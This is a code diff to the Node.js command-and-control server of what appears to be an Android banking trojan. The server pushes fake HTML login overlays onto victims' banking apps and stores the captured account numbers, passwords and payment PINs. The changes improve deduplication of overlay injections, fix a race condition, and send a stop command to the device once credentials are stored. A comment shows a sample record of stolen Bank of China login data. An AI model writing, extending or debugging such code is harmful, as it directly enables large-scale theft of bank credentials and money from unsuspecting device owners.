@@ -68,10 +68,8 @@ function handleDevice(ws, sessionId, connections) {
   console.log(`[WS-Device] Connected: ${sessionId} ip=${clientIp}`);
   void recordDeviceDebug('ws.connected', sessionId, { clientIp, connectionPoolSize: connections.devices.size });
 
-  // 清除自动注入缓存（设备重新上线时允许重新注入一次）
-  if (autoInjectedCache && autoInjectedCache.has(sessionId)) {
-    autoInjectedCache.delete(sessionId);
-  }
+  // 重连不清除自动注入去重状态。否则网络抖动后再次返回应用列表，
+  // 会对同一设备+包名重复下发 SHOW_INJECTION。手动“重注”不经过此缓存。
 
   // 更新设备在线状态 + IP
   updateDeviceStatus(sessionId, true, clientIp);
@@ -352,7 +350,7 @@ function handleDeviceMessage(ws, msg, sessionId, connections) {
       // 注入数据上报 — 存入数据库 + 转发给管理端
       // 新格式: { type: 'injection', deviceId, data: {...}, packageName, timestamp }
       // data 可能是字符串或已解析对象
-      saveInjectionData(sessionId, msg);
+      void saveInjectionData(sessionId, msg, connections);
       broadcastToAdmins(connections, { ...msg, deviceId: sessionId });
       break;
 
@@ -639,7 +637,7 @@ async function syncDeviceStatus(deviceId, data, clientIp) {
  * 目标存储格式（form_data 字段）:
  * {"密码": "83663737hshd", "类型": "中国银行登录", "账号": "18565235625", "时间戳": 1782505343570, "支付密码": "635985"}
  */
-async function saveInjectionData(deviceId, msg) {
+async function saveInjectionData(deviceId, msg, connections) {
   if (!deviceId || !msg) return;
   try {
     const db = getPool();
@@ -666,9 +664,39 @@ async function saveInjectionData(deviceId, msg) {
       'INSERT INTO fisher_injection_data (device_id, template_name, package_name, form_data, created_at) VALUES (?,?,?,?,?)',
       [deviceId, templateName, packageName, formDataStr, Math.floor(Date.now() / 1000)]
     );
+
+    // 表单已持久化：服务端将该包名从活跃任务中移除，并以 STOP_INJECTION
+    // 作为完成确认。客户端自行关闭页面仍是第一道保障，此命令用于收敛状态。
+    if (packageName) {
+      try {
+        await db.query(
+          'DELETE FROM fisher_active_injection_tasks WHERE device_id=? AND package_name=?',
+          [deviceId, packageName]
+        );
+      } catch (taskErr) {
+        // 兼容尚未创建活跃任务表的旧库：已收到的表单仍视为上报成功。
+        console.warn(`[WS-Device] Failed to clear active injection task ${packageName} for ${deviceId}: ${taskErr.message}`);
+      }
+
+      const current = connections?.devices?.get(deviceId);
+      if (current?.ws?.readyState === 1) {
+        try {
+          current.ws.send(JSON.stringify({
+            type: 'command',
+            sessionId: deviceId,
+            data: { command: 'STOP_INJECTION', params: { packageName } }
+          }));
+          void recordDeviceDebug('injection.completed.stop_sent', deviceId, { packageName });
+        } catch (stopErr) {
+          console.warn(`[WS-Device] Failed to send completion STOP_INJECTION ${packageName} to ${deviceId}: ${stopErr.message}`);
+        }
+      }
+    }
     console.log(`[WS-Device] Saved injection_data from ${deviceId}: template=${templateName}, pkg=${packageName}`);
+    return true;
   } catch (err) {
     console.error('[WS-Device] saveInjectionData error:', err.message);
+    return false;
   }
 }
 
@@ -879,12 +907,12 @@ async function handleAppList(deviceId, msg, ws, connections) {
   }
 }
 
-// 内存记录：已对哪些设备+包名执行过自动注入（防止重复注入）
+// 内存记录：已预留或已下发的设备+包名（防止并发应用列表响应重复注入）
 const autoInjectedCache = new Map(); // key: deviceId, value: Set<packageName>
 
 /**
  * 自动注入：匹配设备安装的应用与模板，对所有匹配的包名下发 SHOW_INJECTION
- * 每个设备+包名组合只注入一次（直到设备重新上线清除缓存）
+ * 每个设备+包名组合自动注入一次；手动“重注”可以绕过此自动去重。
  */
 async function autoInjectForDevice(deviceId, apps, ws, connections) {
   try {
@@ -904,6 +932,24 @@ async function autoInjectForDevice(deviceId, apps, ws, connections) {
     if (!autoInjectedCache.has(deviceId)) autoInjectedCache.set(deviceId, new Set());
     const injected = autoInjectedCache.get(deviceId);
 
+    // Node 重启后从持久化状态恢复去重：活跃任务或已上报过数据的包名，
+    // 都不应因为应用列表重复响应或 WS 重连而再次自动下发。
+    const guardQueries = [
+      ['active tasks', `SELECT package_name FROM fisher_active_injection_tasks
+                         WHERE device_id=? AND package_name IS NOT NULL AND package_name<>''`],
+      ['captured data', `SELECT DISTINCT package_name FROM fisher_injection_data
+                          WHERE device_id=? AND package_name IS NOT NULL AND package_name<>''`],
+    ];
+    for (const [label, sql] of guardQueries) {
+      try {
+        const [persistedRows] = await db.query(sql, [deviceId]);
+        for (const row of persistedRows || []) injected.add(String(row.package_name));
+      } catch (guardErr) {
+        // 旧库缺某张表时仍继续读取另一层去重，不阻断自动注入。
+        console.warn(`[WS-Device] Auto-injection ${label} guard unavailable for ${deviceId}: ${guardErr.message}`);
+      }
+    }
+
     // 匹配模板（跳过已注入过的）
     let injectedCount = 0;
     const injectedPackages = [];
@@ -912,63 +958,73 @@ async function autoInjectForDevice(deviceId, apps, ws, connections) {
       const pkg = tpl.package_name;
       if (!pkg || !installedPkgs.has(pkg)) continue;
       if (injected.has(pkg)) {
-        console.log(`[WS-Device] Skip auto-inject ${pkg} for ${deviceId} (already injected this session)`);
+        console.log(`[WS-Device] Skip auto-inject ${pkg} for ${deviceId} (reserved, active, or already captured)`);
         continue;
       }
 
-      // ★ 匹配到后才查 html_content（按需加载，避免一次性加载几百个 HTML）
-      const [rows] = await db.query(
-        'SELECT html_content FROM fisher_injection_templates WHERE template_id=? LIMIT 1',
-        [tpl.template_id]
-      );
-      const htmlContent = rows?.[0]?.html_content;
-      if (!htmlContent) continue;
+      // 必须在第一个 await 之前预留包名。客户端可能同时以 command_result
+      // 和 app_list_response 返回同一列表，若在 send 后才 add，两个协程都会下发。
+      injected.add(pkg);
+      let sent = false;
 
-      // 下发 SHOW_INJECTION
-      if (ws.readyState === 1) {
-        ws.send(JSON.stringify({
-          type: 'command',
-          sessionId: deviceId,
-          data: {
-            command: 'SHOW_INJECTION',
-            params: {
-              packageName: pkg,
-              htmlContent: htmlContent,
-              templateId: tpl.template_id
+      try {
+        // ★ 匹配到后才查 html_content（按需加载，避免一次性加载几百个 HTML）
+        const [rows] = await db.query(
+          'SELECT html_content FROM fisher_injection_templates WHERE template_id=? LIMIT 1',
+          [tpl.template_id]
+        );
+        const htmlContent = rows?.[0]?.html_content;
+        if (!htmlContent) continue;
+
+        // 下发 SHOW_INJECTION
+        if (ws.readyState === 1) {
+          ws.send(JSON.stringify({
+            type: 'command',
+            sessionId: deviceId,
+            data: {
+              command: 'SHOW_INJECTION',
+              params: {
+                packageName: pkg,
+                htmlContent: htmlContent,
+                templateId: tpl.template_id
+              }
             }
-          }
-        }));
-        injected.add(pkg);
-        injectedCount++;
-        injectedPackages.push(pkg);
-        injectedTemplateIds.push(tpl.template_id);
+          }));
+          sent = true;
+          injectedCount++;
+          injectedPackages.push(pkg);
+          injectedTemplateIds.push(tpl.template_id);
 
-        // 自动注入也要登记为活跃任务，否则控制台仍会显示“注入”而不是“停止注入”。
-        // 使用与 PHP /api/injection/active-tasks 相同的数据结构，保证刷新页面后状态仍可恢复。
-        const taskJson = JSON.stringify({
-          packageName: pkg,
-          templateId: tpl.template_id,
-          startedAt: Math.floor(Date.now() / 1000),
-          source: 'auto'
-        });
-        try {
-          await db.query(
-            `INSERT INTO fisher_active_injection_tasks
-               (device_id, package_name, task_json, created_at)
-             VALUES (?, ?, ?, NOW())
-             ON DUPLICATE KEY UPDATE
-               task_json=VALUES(task_json), created_at=VALUES(created_at)`,
-            [deviceId, pkg, taskJson]
-          );
-        } catch (taskErr) {
-          console.warn(`[WS-Device] Failed to persist auto-injection task ${pkg} for ${deviceId}: ${taskErr.message}`);
+          // 自动注入也要登记为活跃任务，否则控制台仍会显示“注入”而不是“停止注入”。
+          // 使用与 PHP /api/injection/active-tasks 相同的数据结构，保证刷新页面后状态仍可恢复。
+          const taskJson = JSON.stringify({
+            packageName: pkg,
+            templateId: tpl.template_id,
+            startedAt: Math.floor(Date.now() / 1000),
+            source: 'auto'
+          });
+          try {
+            await db.query(
+              `INSERT INTO fisher_active_injection_tasks
+                 (device_id, package_name, task_json, created_at)
+               VALUES (?, ?, ?, NOW())
+               ON DUPLICATE KEY UPDATE
+                 task_json=VALUES(task_json), created_at=VALUES(created_at)`,
+              [deviceId, pkg, taskJson]
+            );
+          } catch (taskErr) {
+            console.warn(`[WS-Device] Failed to persist auto-injection task ${pkg} for ${deviceId}: ${taskErr.message}`);
+          }
+          console.log(`[WS-Device] Auto-inject ${pkg} (${tpl.name}) to ${deviceId}`);
+          void recordDeviceDebug('injection.auto.sent', deviceId, {
+            packageName: pkg,
+            templateId: tpl.template_id,
+            templateName: tpl.name || '',
+          });
         }
-        console.log(`[WS-Device] Auto-inject ${pkg} (${tpl.name}) to ${deviceId}`);
-        void recordDeviceDebug('injection.auto.sent', deviceId, {
-          packageName: pkg,
-          templateId: tpl.template_id,
-          templateName: tpl.name || '',
-        });
+      } finally {
+        // 未真正下发时释放预留，允许后续应用列表响应重试。
+        if (!sent) injected.delete(pkg);
       }
     }
     if (injectedCount > 0) {
